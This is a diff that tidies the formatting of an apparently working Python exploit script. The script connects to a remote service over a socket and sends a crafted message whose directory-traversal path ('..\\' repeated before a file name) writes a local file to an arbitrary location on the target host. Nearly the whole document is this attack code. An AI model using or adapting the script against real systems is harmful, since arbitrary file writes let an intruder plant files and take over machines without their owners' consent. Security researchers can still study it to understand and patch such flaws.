@@ -1,5 +1,9 @@
-import socket, argparse, hexdump
+import argparse
+import socket
 from struct import *
+
+import hexdump
+
 
 def dump(title, data):
   print('[-- %s --]' % (title))
@@ -8,7 +12,7 @@ def dump(title, data):
 def mk_msg(type, flags, data, dlen=None):
   if dlen == None:
     dlen = len(data)
-  hdr = pack('>HHL', type, flags, dlen);
+  hdr = pack('>HHL', type, flags, dlen)
   msg = hdr + data
   return msg
 
@@ -37,22 +41,22 @@ s.settimeout(5)
 
 with open(file,'rb') as f: fdata = f.read()
 
-req = pack('<L', 0x100);
+req = pack('<L', 0x100)
 dump('req', req)
 s.sendall(req)
 res = s.recv(4096)
 dump('res', res)
 
 data  = pack('>L', 0xaa)
-data += ('..\..\..\..\..\..\..\..\..\\' + fname).encode() + b'\x00'
+data += ('..\\..\\..\\..\\..\\..\\..\\..\\..\\' + fname).encode() + b'\x00'
 data += b'file_type\x00'
 data += b'unk_str1\x00'
 data += pack('>L', len(fdata))
 data += fdata
- 
+
 req = mk_msg(7, 0x0001, data)
 print('Uploading local file {} as {} on the remote host.'.format(file, fname))
-print('Please check if the file has been uploaded.');
+print('Please check if the file has been uploaded.')
 
 s.sendall(req)
 try:
